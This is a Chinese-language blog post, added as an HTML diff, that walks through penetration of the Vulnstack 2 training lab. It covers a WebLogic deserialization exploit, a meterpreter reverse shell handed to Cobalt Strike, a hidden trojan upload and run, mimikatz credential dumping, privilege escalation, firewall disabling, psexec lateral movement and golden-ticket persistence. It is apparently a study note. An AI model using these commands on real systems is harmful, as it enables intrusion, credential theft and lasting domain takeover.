@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>靶机看答案渗透记录-2 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="参考资料 https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F; 靶场地址 http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;3&#x2F; 环境搭建按照靶机说明把攻击机和WEB，PC放在同一网段内，WEB，PC，DC有私有网段 管理员域\账户&#x2F;密码是 DE1AY\Administrator&#x2F;1qaz@WSX WEB机在C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机看答案渗透记录-2">
+<meta property="og:url" content="http://example.com/2020/12/05/note/web/pentist-2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考资料 https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F; 靶场地址 http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;3&#x2F; 环境搭建按照靶机说明把攻击机和WEB，PC放在同一网段内，WEB，PC，DC有私有网段 管理员域\账户&#x2F;密码是 DE1AY\Administrator&#x2F;1qaz@WSX WEB机在C">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-12-05T10:24:46.000Z">
+<meta property="article:modified_time" content="2020-12-07T08:48:33.459Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-note/web/pentist-2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/12/05/note/web/pentist-2/" class="article-date">
+  	<time datetime="2020-12-05T10:24:46.000Z" itemprop="datePublished">2020-12-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      靶机看答案渗透记录-2
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考资料 <a target="_blank" rel="noopener" href="https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/">https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/</a></p>
+<p>靶场地址 <a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>按照靶机说明把攻击机和WEB，PC放在同一网段内，WEB，PC，DC有私有网段</p>
+<p>管理员域\账户/密码是 DE1AY\Administrator/1qaz@WSX</p>
+<p>WEB机在C:\Oracle\Middleware\user_projects\domains\base_domain中有个startWebLogic，以管理员身份运行</p>
+<p>PC，WEB机计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server, Workstation, Computer Brower全部启动</p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><ol>
+<li>nmap扫一下对应网段，得到靶机地址，得到开放端口。有个7001端口，无论搜端口还是搜服务信息都是WebLogic。</li>
+<li><p>使用WebLogicscan进行扫描</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 WebLogicscan.py -u ip -p 7001</span><br></pre></td></tr></table></figure>
+<p>搜索到一个JAVA反序列化漏洞CVE-2019-2725</p>
+<p>网上查找漏洞利用信息，找到一个msf模块 exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p>
+<p><a target="_blank" rel="noopener" href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725</a></p>
+</li>
+<li>利用模块，需要设置target,LHOST,RHOSTS，可以使用show options,show targets查看相关选项</li>
+<li>获取到了shell</li>
+</ol>
+<p>ctrl+z可以放后台</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>cabaltstrike工具的使用</p>
+<ol>
+<li>建立teamserver ./teamserver 本机IP 连接密码</li>
+<li>启动cabaltstrike客户端，需要java8。连接teamserver。</li>
+<li>工具栏有个耳机图标，单击然后建立一个新的监听，监听4445端口</li>
+</ol>
+<p>msf进行如下操作</p>
+<ol>
+<li>use exploit/windows/local/payload_inject</li>
+<li>set payload windows/meterpreter/reverse_http</li>
+<li>set DisablePayloadHandler true</li>
+<li>set lhost ip</li>
+<li>set lport 4445 </li>
+<li>set session 1</li>
+<li>exploit</li>
+</ol>
+<p>这时再查看CS，已经连接上靶机了</p>
+<p>右键进入beacon界面即可执行命令(右键-&gt;interact)</p>
+<p>要执行shell命令直接在命令之前加shell，如shell dir</p>
+<ol>
+<li>创建监听器用于木马回连</li>
+<li>Attacks-&gt;Packages-&gt;Windows Executable根据靶机类型勾选生成木马</li>
+<li><p>在msf session中使用upload命令上传</p>
+<p>sessions 2</p>
+<p>upload /home/kali/Downloads/artifact.exe C:\Oracle\Middleware\user_projects\domains\base_domain\artifact.exe</p>
+</li>
+<li><p>execute命令执行木马，-H 不可见,-i交互</p>
+<p>execute -H -i -f artifact.exe</p>
+</li>
+<li><p>凭证获取</p>
+<p>在木马连接右键-&gt;access-&gt;dump hashes</p>
+<p>右键-&gt;access-&gt;run mimikatz</p>
+<p>再点击凭证信息</p>
+</li>
+</ol>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>右键-&gt;Access-&gt;提权Elevate</p>
+<p>ms14-058</p>
+<p>成功提升为system权限</p>
+<h2 id="域信息搜集"><a href="#域信息搜集" class="headerlink" title="域信息搜集"></a>域信息搜集</h2><ol>
+<li>获取当前组名 shell net view 需关闭靶机防火墙，否则出错<blockquote>
+<p>第一种 msf&gt; run post/windows/manage/enable_rdp<br>第二种 菜刀命令输入 netsh advfirewall set allprofiles state off</p>
+</blockquote>
+</li>
+<li>查看所有域 net view /domain</li>
+<li>查看IP信息 ipconfig /all</li>
+<li>查看域名 shell net config workstation</li>
+<li><p>查看域内机器IP</p>
+<p>net view</p>
+</li>
+<li><p>查询域控机器</p>
+<p>shell net group “Domain Controllers” /domain</p>
+</li>
+<li><p>查询域管理员</p>
+<p>shell net group “domain admins” /domain</p>
+</li>
+</ol>
+<h2 id="psexec-传递"><a href="#psexec-传递" class="headerlink" title="psexec 传递"></a>psexec 传递</h2><p>传递登陆的概念</p>
+<p>获取凭据后对模板网段进行活端口检测，因为是传递登陆，多以仅需检测445端口</p>
+<p>portscan ip网段 端口 协议 线程</p>
+<p>portscan 10.10.10.0/24 445 arp 200</p>
+<p>view-&gt;Targets查看端口探测后的存活主机</p>
+<p>新建Listener，Payload选择windows/beacon_smb/bind_pipe</p>
+<p>存活主机右键-&gt;Login-&gt;psexec，选择之前后去的凭据信息，选择Listener以及主机Session</p>
+<p>使用相同的方法让PC上线</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>在域控中获取KRBTGT账户NTLM密码hash和SID hashdump</p>
+<p>黄金票据</p>
+<p>WEB机Administrator -&gt;右键-&gt; Access-&gt;Golden Ticket</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域是Windows管理本地网络的一组计算机，是Windows网络中的独立运行的单位</p>
+<p>域管理员可以设置组策略，域成员会统一应用这一组策略。可以统一安装软件，统一配置计算机</p>
+<p>只有Windows专业版和企业版可以连接到域</p>
+<p><strong>域控制器</strong>(DC)是域中负责控制的计算机，负责验证连入域网络计算机的验证工作，至少一台</p>
+<p>域环境中也有DNS，DNS负责支持DC，也负责帮助人找到DC</p>
+<p>域内计算机之间建立了信任关系，在域内访问其它机器，无需再被许可</p>
+<p>AD域</p>
+<h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组中的每一台计算机独立管理自己资源，无法统一管理资源；一个账户只能登陆一台计算机；计算机之间是平等的；每一个计算机都在本地存储用户账户；规模一般小于10台计算机</p>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>认证过程中，client与Kerberos服务器(Access Server)同心会得到TGT，带着TGT请求TGS，得到票据ticket，就可以访问应用服务器。</p>
+<p>黄金票据就是自己生成的TGT，生成过程中user,domain,timestamp和权限会经过krbtgt账户hash加密，所以有这些信息就可以生成票据。krbtgt账户不自动更新的，krbtgt需要域管理权限。有了黄金票据，就免除了向AS验证用户名和密码的阶段。</p>
+<p><strong>winlogin.exe</strong> 接收用户名，密码，域信息，传递给lsass.exe</p>
+<p><strong>lsass.exe</strong> 把经过kerberos处理的用户名密码域SAM进行对比验证，返回结果</p>
+<p><strong>SAM数据库</strong> 存储账号和密码hash的数据库</p>
+<p><strong>NetLogin</strong> 域认证加密信道</p>
+<p>查看域<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p>
+<p>查看账号信息簇，生成，导入都需要mimikatz</p>
+<p>检验缓存票据<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure><br>利用票据访问<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\xx.domain-name</span><br></pre></td></tr></table></figure></p>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>是伪造的TGS，只能访问特定的服务器</p>
+<p>使用mimikatz生成，导入，管理等</p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>可以从lsass.exe处获取账号密码，或从文件中找到密码哈希值</p>
+<p>设置特权 privilege::debug</p>
+<p>获取本机用户名，口令，sid等，导出域 sekurlsa::logonpasswrods</p>
+<p>获得域控权限 需要ms14-068漏洞 ms14-068 -u -p -s -d</p>
+<p>生成缓存，导入伪造缓存 kerberos::ptc test.cache</p>
+<p>登陆：net use 导入的缓存</p>
+<p>导出lsass.dump sekurlsa::minidump lsass.dump<br>sekurlsa::logonPasswords full</p>
+<p>导出所有用户口令 lsadump::sam SYSTEM.hiv SAM.hiv</p>
+<p>net use \A-635ECAEE64804.TEST.LOCAL mimikatz /user：test</p>
+<p>生成黄金票据</p>
+<p>kerberos::golden /user:Administrator /domain:test.local/sid:S-1-5-21-2848411111-3820811111-1717111111/krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi</p>
+<p>？？刷新扫雷记录？ minesweeper::Infos</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a3ddd7502c09">https://www.jianshu.com/p/a3ddd7502c09</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/12/07/note/rev/android-database-decryption/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          高版本Android数据库加密分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/11/27/note/papers/1-1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">app行为的语义提取方案读论文笔记</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="note/web/pentist-2" data-title="靶机看答案渗透记录-2" data-url="http://example.com/2020/12/05/note/web/pentist-2/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="靶机看答案渗透记录-2">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
